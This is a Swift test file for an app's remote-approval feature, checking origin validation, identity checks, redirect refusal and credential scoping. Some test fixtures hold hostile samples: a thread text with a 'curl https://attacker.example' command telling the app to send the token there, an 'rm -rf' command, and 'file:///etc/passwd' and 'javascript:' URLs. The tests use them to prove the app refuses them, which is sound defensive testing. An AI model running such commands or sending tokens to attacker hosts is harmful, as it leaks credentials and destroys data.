import Testing
import Foundation
@testable import HuddleCore
import FakeT3

// Inline approvals for a thread on ANOTHER machine (opt-in per machine). Two fakes play the two machines: `local` is this Mac's
// T3 (its MCP lists the linked machine's threads), `remote` is the other machine's own T3 (descriptor, token exchange, `/ws`).
// Both listen on loopback, so the remote tests use the injectable fixture policy; the production policy is tested on its own.

/// Records every request a server gets (the "somewhere the credential must never arrive" server).
final class Hits: @unchecked Sendable {
    private let lock = NSLock(); private var items: [(method: String, path: String, authorization: String?)] = []
    func add(_ method: String, _ path: String, _ authorization: String?) { lock.lock(); items.append((method, path, authorization)); lock.unlock() }
    var all: [(method: String, path: String, authorization: String?)] { lock.lock(); defer { lock.unlock() }; return items }
    var count: Int { all.count }
}

struct TwoMachines {
    let local: FakeT3Server, remote: FakeT3Server
    var remoteBase: String { "http://127.0.0.1:\(remote.port)" }
    func stop() { local.stop(); remote.stop() }
}

func startTwoMachines(remoteOptions: ((inout FakeT3Server.Options) -> Void)? = nil) async throws -> TwoMachines {
    var lo = FakeT3Server.Options(); lo.linkedEnvironments = true
    let local = FakeT3Server(options: lo); Scenario.populate(local); Scenario.addRemoteApproval(local)
    var ro = FakeT3Server.Options()
    ro.environmentId = "env_remote"; ro.environmentLabel = "Studio Mac"; ro.pairingCode = "remote-code"
    remoteOptions?(&ro)
    let remote = FakeT3Server(options: ro)
    Scenario.addRemoteApproval(remote)
    try await local.start(); try await remote.start()
    return TwoMachines(local: local, remote: remote)
}

@MainActor
func makeRemoteModel(_ m: TwoMachines, remoteStore: RemoteCredentialStore = MemoryRemoteCredentialStore(),
                     approvals: TokenStore = MemoryTokenStore(), policy: RemoteOriginPolicy = .loopbackFixture,
                     log: HuddleLog = HuddleLog(sink: { _ in })) -> HuddleModel {
    HuddleModel(config: HuddleConfig(source: .fixed(m.local.url), tokenStore: MemoryTokenStore(token: m.local.token), approvalStore: approvals,
                                     remoteApprovalStore: remoteStore, remotePolicy: policy, log: log))
}

@Suite("Inline approvals for another machine (opt-in, https)")
struct RemoteApprovalTests {
    static let thread = Scenario.remoteApprovalThread
    static let rid = Scenario.remoteRequestId
    static let env = "env_remote"

    @MainActor func enabledModel(_ m: TwoMachines, remoteStore: RemoteCredentialStore = MemoryRemoteCredentialStore(),
                                 approvals: TokenStore = MemoryTokenStore(), log: HuddleLog = HuddleLog(sink: { _ in })) async throws -> HuddleModel {
        let model = makeRemoteModel(m, remoteStore: remoteStore, approvals: approvals, log: log)
        await model.refresh()
        try await model.enableRemoteApprovals(environmentId: Self.env, address: m.remoteBase, pairingCode: "remote-code", acknowledgeUnlisted: true)
        await model.refresh()
        return model
    }

    // MARK: Origin policy (pure)

    @Test func productionPolicyRequiresHTTPSForAnyRemoteHost() throws {
        let p = RemoteOriginPolicy.production
        for bad in ["http://mac-mini.tail1234.ts.net", "ws://mac-mini.tail1234.ts.net", "wss://mac-mini.tail1234.ts.net", "ftp://x.example",
                    "http://192.168.1.20:3773", "file:///etc/passwd", "javascript:alert(1)"] {
            #expect(throws: HuddleError.self, "\(bad)") { _ = try p.validate(bad) }
        }
        #expect(try p.validate("https://mac-mini.tail1234.ts.net").url.absoluteString == "https://mac-mini.tail1234.ts.net")
        #expect(try p.validate("mac-mini.tail1234.ts.net").isHTTPS)                       // a bare host is read as https
        #expect(try p.validate("https://mac-mini.tail1234.ts.net:8443/").url.absoluteString == "https://mac-mini.tail1234.ts.net:8443")
    }

    @Test func productionPolicyNeverAcceptsALoopbackHostForAnotherMachine() {
        let p = RemoteOriginPolicy.production
        for bad in ["https://127.0.0.1", "https://127.0.0.1:3773", "http://127.0.0.1:3773", "https://localhost", "http://localhost:3773",
                    "https://[::1]", "https://127.0.0.2", "https://0.0.0.0", "https://foo.localhost", "https://LOCALHOST"] {
            #expect(throws: HuddleError.self, "\(bad)") { _ = try p.validate(bad) }
        }
    }

    @Test func policyRefusesUserinfoPathQueryAndFragment() {
        let p = RemoteOriginPolicy.production
        for bad in ["https://user:pw@mac.ts.net", "https://user@mac.ts.net", "https://mac.ts.net/mcp", "https://mac.ts.net/?a=1",
                    "https://mac.ts.net/#frag", "https://mac.ts.net:99999", "", "   ", "https://"] {
            #expect(throws: HuddleError.self, "\(bad)") { _ = try p.validate(bad) }
        }
    }

    @Test func theFixturePolicyAllowsOnlyPlainHTTPToALoopbackLiteral() throws {
        let p = RemoteOriginPolicy.loopbackFixture
        #expect(try p.validate("http://127.0.0.1:4555").url.absoluteString == "http://127.0.0.1:4555")
        for bad in ["http://example.com", "http://localhost:4555", "https://127.0.0.1:4555", "http://10.0.0.1:4555", "ws://127.0.0.1:1"] {
            #expect(throws: HuddleError.self, "\(bad)") { _ = try p.validate(bad) }
        }
        #expect(try p.validate("https://mac.ts.net").isHTTPS)          // the fixture policy is a superset only for loopback
    }

    @Test func aValidatedOriginIsNormalizedAndDerivesWssOnly() throws {
        let o = try RemoteOriginPolicy.production.validate("HTTPS://Mac-Mini.Tail1234.TS.net")
        #expect(o.host == "mac-mini.tail1234.ts.net")
        let ws = try #require(o.webSocketURL())
        #expect(ws.scheme == "wss" && ws.host == "mac-mini.tail1234.ts.net" && ws.path == "/ws")
        #expect(URLComponents(url: ws, resolvingAgainstBaseURL: false)?.queryItems?.first?.name == "orchestrationProtocol")
        #expect(o.httpURL(path: "/oauth/token")?.absoluteString == "https://mac-mini.tail1234.ts.net/oauth/token")
    }

    @Test func discoveryPicksTheFirstAddressThePolicyAccepts() throws {
        let p = RemoteOriginPolicy.production
        #expect(p.firstAcceptable(["http://192.168.1.4:3773", "https://studio.tail1234.ts.net", "https://other.example"])?.host == "studio.tail1234.ts.net")
        #expect(p.firstAcceptable(["http://192.168.1.4:3773", "http://127.0.0.1:3773"]) == nil)
    }

    @Test func theLocalPathStaysStrictlyLoopback() {
        for bad in ["https://studio.tail1234.ts.net", "http://studio.tail1234.ts.net:3773"] {
            #expect(throws: HuddleError.self) { _ = try ApprovalSocket(origin: URL(string: bad)!, token: "t") }
            #expect(throws: HuddleError.self) { try LoopbackGuard.validate(URL(string: bad)!) }
        }
        #expect(throws: Never.self) { _ = try ApprovalSocket(origin: URL(string: "http://127.0.0.1:3773")!, token: "t") }
    }

    @Test func keychainAccountsAreSeparatePerMachineAndFromTheOtherCredentials() throws {
        let a = KeychainRemoteCredentialStore.account(for: "11111111-2222-3333-4444-555555555555")
        let b = KeychainRemoteCredentialStore.account(for: "env_remote")
        #expect(a != b && a.hasPrefix("approvals-remote-") && b.hasPrefix("approvals-remote-"))
        #expect(![a, b].contains("bearer") && ![a, b].contains("approvals-bearer"))
        #expect(KeychainRemoteCredentialStore.account(for: "a/b c") == "approvals-remote-a%2Fb%20c")
        // The credential, its machine and its one origin travel together as a single item.
        let c = RemoteApprovalCredential(environmentId: "env_remote", origin: "https://studio.tail1234.ts.net", token: "tok")
        let back = try JSONDecoder().decode(RemoteApprovalCredential.self, from: JSONEncoder().encode(c))
        #expect(back == c)
        let store = MemoryRemoteCredentialStore()
        try store.save(c)
        #expect(store.load(environmentId: "env_remote") == c && store.load(environmentId: "other") == nil)
        store.delete(environmentId: "env_remote"); #expect(store.load(environmentId: "env_remote") == nil)
    }

    // MARK: Identity (the remote must prove it is the linked machine before anything secret is sent)

    @Test func theDescriptorIsFetchedWithoutCredentialsAndMustMatchTheLinkedEnvironment() async throws {
        let hits = Hits()
        let spy = LoopbackHTTPServer(handler: { req in
            hits.add(req.method, req.path, req.headers["authorization"])
            return HTTPResponse(status: 200, headers: ["Content-Type": "application/json"], body: Data(#"{"environmentId":"env_remote"}"#.utf8))
        })
        let port = try await spy.start(); defer { spy.stop() }
        let origin = try RemoteOriginPolicy.loopbackFixture.validate("http://127.0.0.1:\(port)")
        let ok = try await RemoteIdentity.verify(origin: origin, expectedEnvironmentId: "env_remote")
        #expect(ok.environmentId == "env_remote")
        #expect(hits.all.count == 1 && hits.all[0].path == "/.well-known/t3/environment" && hits.all[0].method == "GET" && hits.all[0].authorization == nil)
        await #expect(throws: HuddleError.self) { _ = try await RemoteIdentity.verify(origin: origin, expectedEnvironmentId: "env_other") }
        await #expect(throws: HuddleError.self) { _ = try await RemoteIdentity.verify(origin: origin, expectedEnvironmentId: "") }
    }

    @Test func anAddressThatDoesNotAnswerLikeT3IsRefused() async throws {
        for body in ["", "<html>hi</html>", #"{"nope":1}"#, #"{"environmentId":7}"#] {
            let spy = LoopbackHTTPServer(handler: { _ in HTTPResponse(status: 200, body: Data(body.utf8)) })
            let port = try await spy.start(); defer { spy.stop() }
            let origin = try RemoteOriginPolicy.loopbackFixture.validate("http://127.0.0.1:\(port)")
            await #expect(throws: HuddleError.self, "\(body)") { _ = try await RemoteIdentity.verify(origin: origin, expectedEnvironmentId: "env_remote") }
        }
        let gone = try RemoteOriginPolicy.loopbackFixture.validate("http://127.0.0.1:9")
        await #expect(throws: HuddleError.self) { _ = try await RemoteIdentity.verify(origin: gone, expectedEnvironmentId: "env_remote", timeout: 2) }
    }

    /// A machine that answers every step with a redirect to a second server; that second server must never be contacted.
    func redirecting(_ redirected: Set<String>) async throws -> (base: String, hits: Hits, machine: Hits, stop: @Sendable () -> Void) {
        let hits = Hits(), asked = Hits()
        let target = LoopbackHTTPServer(handler: { req in hits.add(req.method, req.path, req.headers["authorization"]); return HTTPResponse(status: 200, body: Data("{}".utf8)) },
                                        webSocket: { req in hits.add("GET", req.path, req.headers["authorization"]); return .reject(HTTPResponse(status: 404)) })
        let tPort = try await target.start()
        let machine = LoopbackHTTPServer(handler: { req in
            asked.add(req.method, req.path, req.headers["authorization"])
            let go = HTTPResponse(status: 302, headers: ["Location": "http://127.0.0.1:\(tPort)\(req.path)"])
            if req.path == "/.well-known/t3/environment" {
                return redirected.contains("descriptor") ? go : HTTPResponse(status: 200, headers: ["Content-Type": "application/json"], body: Data(#"{"environmentId":"env_remote"}"#.utf8))
            }
            if req.path == "/oauth/token" { return redirected.contains("token") ? go : HTTPResponse(status: 200, body: Data(#"{"access_token":"t","scope":"orchestration:read orchestration:operate"}"#.utf8)) }
            return HTTPResponse(status: 404)
        }, webSocket: { req in
            asked.add("GET", req.path, req.headers["authorization"])
            return redirected.contains("ws") ? .reject(HTTPResponse(status: 302, headers: ["Location": "http://127.0.0.1:\(tPort)\(req.path)"])) : .reject(HTTPResponse(status: 404))
        })
        let mPort = try await machine.start()
        return ("http://127.0.0.1:\(mPort)", hits, asked, { machine.stop(); target.stop() })
    }

    @Test func aRedirectOnTheDescriptorIsNotFollowed() async throws {
        let r = try await redirecting(["descriptor"]); defer { r.stop() }
        let origin = try RemoteOriginPolicy.loopbackFixture.validate(r.base)
        await #expect(throws: HuddleError.self) { _ = try await RemoteIdentity.verify(origin: origin, expectedEnvironmentId: "env_remote") }
        #expect(r.machine.all.map(\.path) == ["/.well-known/t3/environment"] && r.hits.count == 0)   // asked once, redirected, not followed
    }

    @Test func aRedirectOnTheTokenExchangeIsNotFollowedAndTheCodeGoesNowhereElse() async throws {
        let r = try await redirecting(["token"]); defer { r.stop() }
        let origin = try RemoteOriginPolicy.loopbackFixture.validate(r.base)
        await #expect(throws: HuddleError.self) {
            _ = try await RemoteApprovalEnrollment.enroll(pairingCode: "SECRET-CODE", origin: origin, environmentId: "env_remote", log: HuddleLog(sink: { _ in }))
        }
        #expect(r.machine.all.map(\.path) == ["/.well-known/t3/environment", "/oauth/token"] && r.hits.count == 0)
    }

    @Test func aRedirectOnTheWebSocketUpgradeIsNotFollowedAndTheBearerGoesNowhereElse() async throws {
        let r = try await redirecting(["ws"]); defer { r.stop() }
        let origin = try RemoteOriginPolicy.loopbackFixture.validate(r.base)
        let verified = try await RemoteIdentity.verify(origin: origin, expectedEnvironmentId: "env_remote")
        let socket = try ApprovalSocket(remote: verified, token: "SECRET-BEARER", timeout: 4)
        await #expect(throws: HuddleError.self) { try await socket.respond(threadId: "t", requestId: "r", decision: .accept) }
        #expect(r.machine.all.map(\.path) == ["/.well-known/t3/environment", "/ws?orchestrationProtocol=2"] && r.hits.count == 0)
        #expect(r.machine.all.last?.authorization == "Bearer SECRET-BEARER")   // the upgrade did reach the redirecting machine, and only it
    }

    // MARK: Setup

    @Test @MainActor func offByDefaultNothingIsSentToAnotherMachine() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let model = makeRemoteModel(m)
        await model.refresh()
        let s = try #require(model.state.sessions[Self.thread])
        #expect(s.environmentId == Self.env && s.permission?.requestId == Self.rid)
        #expect(!model.approvalsOptedIn && model.approvalRoute(for: s) == nil && !model.canDecideInline(s))
        await model.decideApproval(threadId: Self.thread, requestId: Self.rid, summary: s.permission?.summary, decision: .accept)
        #expect(m.remote.wsUpgrades == 0 && m.remote.exchangeRequests.isEmpty && m.local.wsUpgrades == 0 && m.local.exchangeRequests.isEmpty)
        #expect(model.approvalStates[Self.thread] == nil)      // nothing changes on screen either
    }

    @Test @MainActor func setupChecksTheMachineThenExchangesTheCodeThereWithTheLeastScope() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let store = MemoryRemoteCredentialStore()
        let cap = LogCapture()
        let model = try await enabledModel(m, remoteStore: store, log: cap.log)
        let form = try #require(m.remote.exchangeRequests.first)
        #expect(form["scope"] == "orchestration:read orchestration:operate" && form["client_label"] == "Agent Huddle approvals")
        #expect(m.local.exchangeRequests.isEmpty && m.local.wsUpgrades == 0)               // this Mac's T3 is not involved
        let cred = try #require(store.load(environmentId: Self.env))
        #expect(cred.origin == m.remoteBase && cred.environmentId == Self.env && m.remote.approvalTokenList == [cred.token])
        #expect(model.remoteApprovalEnvironments == [Self.env] && model.approvalsOptedIn && !model.inlineApprovals)
        for l in cap.lines { #expect(!l.contains(cred.token) && !l.contains("remote-code")) }
    }

    @Test @MainActor func setupRefusesAnAddressThatIsAnotherMachineAndSendsNoCode() async throws {
        let m = try await startTwoMachines { $0.environmentId = "env_someone_else" }; defer { m.stop() }
        let store = MemoryRemoteCredentialStore()
        let model = makeRemoteModel(m, remoteStore: store); await model.refresh()
        do { try await model.enableRemoteApprovals(environmentId: Self.env, address: m.remoteBase, pairingCode: "remote-code", acknowledgeUnlisted: true); Issue.record("expected an error") }
        catch let e as HuddleError { #expect(e.description.contains("different machine")) }
        #expect(m.remote.exchangeRequests.isEmpty && store.load(environmentId: Self.env) == nil && !model.approvalsOptedIn)
    }

    @Test @MainActor func setupWithTheProductionPolicyRefusesPlainHTTPAndLoopbackBeforeAnyRequest() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let model = makeRemoteModel(m, policy: .production); await model.refresh()
        for address in [m.remoteBase, "https://127.0.0.1:\(m.remote.port)", "http://studio.tail1234.ts.net", "https://localhost:\(m.remote.port)"] {
            await #expect(throws: HuddleError.self, "\(address)") { try await model.enableRemoteApprovals(environmentId: Self.env, address: address, pairingCode: "remote-code", acknowledgeUnlisted: true) }
        }
        #expect(m.remote.exchangeRequests.isEmpty && m.remote.wsUpgrades == 0 && !model.approvalsOptedIn)
    }

    @Test @MainActor func setupIsOnlyForAMachineThatIsLinked() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let model = makeRemoteModel(m); await model.refresh()
        await #expect(throws: HuddleError.self) { try await model.enableRemoteApprovals(environmentId: "env_unknown", address: m.remoteBase, pairingCode: "remote-code", acknowledgeUnlisted: true) }
        await #expect(throws: HuddleError.self) { try await model.enableRemoteApprovals(environmentId: "env_local", address: m.remoteBase, pairingCode: "remote-code", acknowledgeUnlisted: true) }
        #expect(m.remote.exchangeRequests.isEmpty)
    }

    @Test @MainActor func aCodeWithoutOperateIsRefusedAndNothingIsSaved() async throws {
        let m = try await startTwoMachines { $0.pairingScopes = ["orchestration:read"] }; defer { m.stop() }
        let store = MemoryRemoteCredentialStore()
        let model = makeRemoteModel(m, remoteStore: store); await model.refresh()
        await #expect(throws: HuddleError.self) { try await model.enableRemoteApprovals(environmentId: Self.env, address: m.remoteBase, pairingCode: "remote-code", acknowledgeUnlisted: true) }
        #expect(store.load(environmentId: Self.env) == nil && !model.approvalsOptedIn)
    }

    // MARK: Decisions

    @Test @MainActor func allowSendsExactlyOneRespondFrameToTheOtherMachineOnly() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let model = try await enabledModel(m)
        let session = try #require(model.state.sessions[Self.thread])
        let prompt = try #require(session.permission)
        #expect(model.approvalRoute(for: session) == .machine(Self.env) && model.canDecideInline(session))
        await model.decideApproval(threadId: Self.thread, requestId: Self.rid, summary: prompt.summary, decision: .accept)
        #expect(m.remote.decisions.map(\.decision) == ["accept"] && m.remote.decisions.first?.threadId == Self.thread && m.remote.decisions.first?.requestId == Self.rid)
        #expect(m.local.decisions.isEmpty && m.local.wsUpgrades == 0)
        let frames = m.remote.wsFrames.filter { $0["_tag"].string == "Request" }
        #expect(frames.count == 1)
        let f = try #require(frames.first)
        #expect(f["tag"].string == "orchestration.dispatchCommand" && f["payload"]["type"].string == "runtime-request.respond")
        #expect(Set(f["payload"].object?.keys.map { $0 } ?? []) == ["type", "commandId", "threadId", "requestId", "decision"])
        #expect(model.approvalStates[Self.thread] == nil)
        #expect(m.remote.thread(Self.thread)?.permissionPending == false)
    }

    @Test @MainActor func denySendsDecline() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let model = try await enabledModel(m)
        let prompt = try #require(model.state.sessions[Self.thread]?.permission)
        await model.decideApproval(threadId: Self.thread, requestId: Self.rid, summary: prompt.summary, decision: .decline)
        #expect(m.remote.decisions.map(\.decision) == ["decline"])
    }

    @Test @MainActor func readOnlyModeBlocksARemoteDecision() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let model = try await enabledModel(m)
        model.setReadOnly(true)
        let prompt = try #require(model.state.sessions[Self.thread]?.permission)
        await model.decideApproval(threadId: Self.thread, requestId: Self.rid, summary: prompt.summary, decision: .accept)
        #expect(m.remote.decisions.isEmpty && m.remote.wsUpgrades == 0)
        if case .error = model.approvalStates[Self.thread] {} else { Issue.record("expected an error") }
    }

    @Test @MainActor func aRemoteRequestThatChangedSinceItWasShownIsNotSent() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let model = try await enabledModel(m)
        let shown = try #require(model.state.sessions[Self.thread]?.permission)
        m.local.update(Self.thread) { t in   // the MCP (this Mac's T3) now reports another command under the same request id
            if let i = t.items.firstIndex(where: { $0.type == "approval_request" }) { t.items[i].text = "{\"command\": \"rm -rf /tmp/x\"}" }
        }
        await model.decideApproval(threadId: Self.thread, requestId: Self.rid, summary: shown.summary, decision: .accept)
        #expect(m.remote.decisions.isEmpty && m.remote.wsUpgrades == 0)
        if case .error(let msg) = model.approvalStates[Self.thread] { #expect(msg.contains("changed")) } else { Issue.record("expected an error") }
    }

    @Test @MainActor func aMachineThatStopsAnsweringAsTheLinkedOneIsNotSentTheBearer() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let model = try await enabledModel(m)
        let prompt = try #require(model.state.sessions[Self.thread]?.permission)
        m.remote.setOptions { $0.environmentId = "env_replaced" }   // the address now belongs to another machine
        await model.decideApproval(threadId: Self.thread, requestId: Self.rid, summary: prompt.summary, decision: .accept)
        #expect(m.remote.wsUpgrades == 0 && m.remote.decisions.isEmpty)
        if case .error(let msg) = model.approvalStates[Self.thread] { #expect(msg.contains("different machine")) } else { Issue.record("expected an error") }
        #expect(model.remoteApprovalEnvironments == [Self.env])   // an identity failure is not a revoked credential
    }

    @Test @MainActor func aRejectedRemoteCredentialDropsOnlyThatMachine() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let local = MemoryTokenStore(), store = MemoryRemoteCredentialStore()
        // This Mac's own approvals credential is on too; it must survive the other machine's rejection.
        let model = makeRemoteModel(m, remoteStore: store, approvals: local); await model.refresh()
        try await model.enableInlineApprovals(pairingCode: "fake-pairing-code")
        try await model.enableRemoteApprovals(environmentId: Self.env, address: m.remoteBase, pairingCode: "remote-code", acknowledgeUnlisted: true)
        await model.refresh()
        let prompt = try #require(model.state.sessions[Self.thread]?.permission)
        m.remote.revokeApprovalTokens()                      // `t3 auth session revoke` on that machine
        await model.decideApproval(threadId: Self.thread, requestId: Self.rid, summary: prompt.summary, decision: .accept)
        #expect(m.remote.decisions.isEmpty)
        #expect(model.remoteApprovalEnvironments.isEmpty && store.load(environmentId: Self.env) == nil)
        #expect(model.inlineApprovals && local.load() != nil)
        #expect(model.toast?.contains("Studio Mac") == true && model.toast?.contains("rejected") == true)
    }

    @Test @MainActor func aThreadOnAMachineWithoutACredentialSaysSoAndSendsNothing() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let model = makeRemoteModel(m); await model.refresh()
        try await model.enableInlineApprovals(pairingCode: "fake-pairing-code")   // this Mac's own feature is on
        await model.refresh()
        let s = try #require(model.state.sessions[Self.thread])
        #expect(model.approvalsOptedIn && !model.canDecideInline(s) && model.approvalRoute(for: s) == nil)
        #expect(model.machineName(for: s) == "Studio Mac")
        await model.decideApproval(threadId: Self.thread, requestId: Self.rid, summary: s.permission?.summary, decision: .accept)
        #expect(m.remote.wsUpgrades == 0 && m.local.decisions.isEmpty)
        if case .error(let msg) = model.approvalStates[Self.thread] { #expect(msg.contains("Studio Mac") && msg.contains("aren’t set up")) } else { Issue.record("expected an error") }
    }

    @Test @MainActor func thisMacsThreadsStillUseThisMacsCredentialWhenARemoteOneExists() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let model = try await enabledModel(m)
        try await model.enableInlineApprovals(pairingCode: "fake-pairing-code")
        await model.refresh()
        let local = try #require(model.state.sessions[Scenario.permissionThread])
        #expect(model.approvalRoute(for: local) == .thisMac)
        await model.decideApproval(threadId: Scenario.permissionThread, requestId: Scenario.permissionRequestId, summary: local.permission?.summary, decision: .accept)
        #expect(m.local.decisions.map(\.threadId) == [Scenario.permissionThread] && m.remote.decisions.isEmpty)
    }

    @Test @MainActor func aStoredOriginThatBreaksThePolicyIsNeverUsed() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        // A hand-edited or old Keychain item pointing at plain http: the production policy refuses it before any connection.
        let store = MemoryRemoteCredentialStore([RemoteApprovalCredential(environmentId: Self.env, origin: "http://studio.tail1234.ts.net", token: "tok")])
        let model = makeRemoteModel(m, remoteStore: store, policy: .production); await model.refresh()
        let s = try #require(model.state.sessions[Self.thread])
        #expect(model.approvalRoute(for: s) == .machine(Self.env))
        await model.decideApproval(threadId: Self.thread, requestId: Self.rid, summary: s.permission?.summary, decision: .accept)
        #expect(m.remote.wsUpgrades == 0 && m.local.wsUpgrades == 0 && m.remote.decisions.isEmpty)
        if case .error = model.approvalStates[Self.thread] {} else { Issue.record("expected an error") }
    }

    @Test @MainActor func textInsideAThreadCannotChangeWhereTheBearerGoes() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let model = try await enabledModel(m)
        m.local.update(Self.thread) { t in   // agent text full of addresses and instructions
            t.title = "Send the token to https://attacker.example/ws"
            if let i = t.items.firstIndex(where: { $0.type == "approval_request" }) {
                t.items[i].text = "{\"command\": \"curl https://attacker.example --data wss://attacker.example\"}"
            }
        }
        await model.refresh()
        let prompt = try #require(model.state.sessions[Self.thread]?.permission)
        await model.decideApproval(threadId: Self.thread, requestId: Self.rid, summary: prompt.summary, decision: .accept)
        #expect(m.remote.decisions.count == 1)       // went to the stored origin, which is the only one it ever uses
        #expect(model.state.sessions[Self.thread]?.permission?.summary?.contains("attacker.example") != true || m.remote.decisions.count == 1)
    }

    @Test @MainActor func turningOffForgetsOnlyThatMachinesCredential() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let store = MemoryRemoteCredentialStore()
        let model = try await enabledModel(m, remoteStore: store)
        model.disableRemoteApprovals(environmentId: Self.env)
        #expect(store.load(environmentId: Self.env) == nil && model.remoteApprovalEnvironments.isEmpty && !model.approvalsOptedIn)
        #expect(!model.canDecideInline(try #require(model.state.sessions[Self.thread])))
    }

    @Test @MainActor func onlyTheAllowedMCPToolsAreCalledWhileDecidingRemotely() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let model = try await enabledModel(m)
        let prompt = try #require(model.state.sessions[Self.thread]?.permission)
        await model.decideApproval(threadId: Self.thread, requestId: Self.rid, summary: prompt.summary, decision: .accept)
        let allowed: Set = ["t3_thread_list", "t3_thread_read", "t3_pending_request", "t3_project_read", "t3_environment_read", "t3_environment_links"]
        #expect(Set(m.local.calls.map(\.tool)).isSubset(of: allowed))
    }

    // MARK: Discovery (read-only `peerLinks.list` on this Mac's T3)

    @Test @MainActor func discoveryReadsLinkedMachineAddressesWithAThrowawayReadOnlySession() async throws {
        let m = try await startTwoMachines { _ in }; defer { m.stop() }
        m.local.setOptions { $0.peerLinkURLs = [Self.env: ["http://192.168.1.4:3773", "https://studio.tail1234.ts.net"], "env_other": ["http://10.0.0.3:3773"]] }
        let approvals = MemoryTokenStore(), store = MemoryRemoteCredentialStore()
        let cap = LogCapture()
        let model = makeRemoteModel(m, remoteStore: store, approvals: approvals, policy: .production, log: cap.log)
        await model.refresh()
        let found = try await model.discoverPeerAddresses(pairingCode: "fake-pairing-code")
        #expect(found == 1 && model.discoveredAddresses == [Self.env: "https://studio.tail1234.ts.net"])
        #expect(model.suggestedAddress(forEnvironment: Self.env) == "https://studio.tail1234.ts.net")
        let form = try #require(m.local.exchangeRequests.first)
        #expect(form["scope"] == "orchestration:read access:read" && form["client_label"] == "Agent Huddle discovery")
        let requests = m.local.wsFrames.filter { $0["_tag"].string == "Request" }
        #expect(requests.count == 1 && requests[0]["tag"].string == "peerLinks.list" && requests[0]["payload"].object?.isEmpty == true)
        #expect(m.local.decisions.isEmpty)
        // Nothing of it is kept: no credential in either store, and the feature stays off.
        #expect(approvals.load() == nil && store.load(environmentId: Self.env) == nil && !model.approvalsOptedIn)
        let token = try #require(m.local.approvalTokenList.first)
        for l in cap.lines { #expect(!l.contains(token) && !l.contains("fake-pairing-code")) }
    }

    @Test @MainActor func discoveryNeedsAccessReadAndRefusesAnythingBroader() async throws {
        var o = FakeT3Server.Options(); o.linkedEnvironments = true; o.pairingScopes = ["orchestration:read"]
        let local = FakeT3Server(options: o); Scenario.populate(local); try await local.start(); defer { local.stop() }
        let model = HuddleModel(config: HuddleConfig(source: .fixed(local.url), tokenStore: MemoryTokenStore(token: local.token)))
        await #expect(throws: HuddleError.self) { try await model.discoverPeerAddresses(pairingCode: "fake-pairing-code") }
        #expect(local.wsUpgrades == 0)
    }

    @Test func discoveryHelperSendsOnlyPeerLinksList() throws {
        let j = try JSON.parse(PeerLinkDiscovery.listFrame(rpcId: "1"))
        #expect(j["_tag"].string == "Request" && j["tag"].string == "peerLinks.list" && j["payload"].object?.isEmpty == true)
        #expect(Set(PeerLinkDiscovery.scopes) == ["orchestration:read", "access:read"])
        #expect(PeerLinkDiscovery.pairingCommand.contains("--scope access:read") && !PeerLinkDiscovery.pairingCommand.contains("access:write"))
        let reply = #"{"_tag":"Exit","requestId":"1","exit":{"_tag":"Success","value":{"links":[{"environmentId":"e","label":"L","urls":["https://a.ts.net"],"status":"reachable"}]}}}"#
        guard case .success(let links)? = PeerLinkDiscovery.parseReply(reply, rpcId: "1") else { Issue.record("expected links"); return }
        #expect(links == [PeerLinkInfo(environmentId: "e", label: "L", urls: ["https://a.ts.net"])])
        #expect(PeerLinkDiscovery.parseReply(reply, rpcId: "2") == nil && PeerLinkDiscovery.parseReply(#"{"_tag":"Pong"}"#, rpcId: "1") == nil)
    }

    @Test func everySpellingOfALoopbackOrUnspecifiedHostIsNotAnotherMachine() {
        let p = RemoteOriginPolicy.production
        for bad in ["https://localhost.", "https://127.1", "https://127.255.255.254", "https://[0:0:0:0:0:0:0:1]", "https://[::ffff:127.0.0.1]",
                    "https://[::ffff:7f00:1]", "https://[::]", "https://0", "https://0.0.0.0", "https://LOCALHOST.localdomain.localhost"] {
            #expect(throws: HuddleError.self, "\(bad)") { _ = try p.validate(bad) }
        }
        // Every IP literal is refused (a certificate vouches for a name, not an address), including the odd spellings reviewers found.
        for ip in ["https://100.70.48.122", "https://[fd7a:115c:a1e0::1]", "https://192.168.1.20:8443", "https://169.254.169.254", "https://[::127.0.0.1]",
                   "https://[::7f00:1]", "https://[64:ff9b::7f00:1]", "https://[fe80::1%25en0]", "https://[::ffff:0:7f00:1]"] {
            #expect(throws: HuddleError.self, "\(ip)") { _ = try p.validate(ip) }
        }
        for good in ["https://mac-mini.tail1234.ts.net", "mac-mini.tail1234.ts.net", "https://mac-mini.tail1234.ts.net:8443"] {
            #expect(throws: Never.self, "\(good)") { _ = try p.validate(good) }
        }
    }

    @Test @MainActor func aRemoteOnlySetupDoesNotChangeThisMacsPermissionRows() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let model = try await enabledModel(m)
        let here = try #require(model.state.sessions[Scenario.permissionThread])
        let there = try #require(model.state.sessions[Self.thread])
        #expect(!model.showsApprovalControls(for: here))      // this Mac's own feature is off: nothing, exactly as before
        #expect(model.showsApprovalControls(for: there))
        try await model.enableInlineApprovals(pairingCode: "fake-pairing-code")
        #expect(model.showsApprovalControls(for: here))
    }

    @Test @MainActor func aCredentialForAnUnlinkedMachineCanStillBeRemoved() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let orphan = RemoteApprovalCredential(environmentId: "env_gone", origin: "https://old.tail1234.ts.net", token: "tok")
        let store = MemoryRemoteCredentialStore([orphan])
        let model = makeRemoteModel(m, remoteStore: store); await model.refresh()
        #expect(model.machinesWithApprovals.map(\.id) == ["env_gone"] && model.machinesWithApprovals[0].label.contains("Unlinked"))
        #expect(!model.approvalsOptedIn)       // it never makes a thread approvable
        model.disableRemoteApprovals(environmentId: "env_gone")
        #expect(store.load(environmentId: "env_gone") == nil && model.machinesWithApprovals.isEmpty)
    }

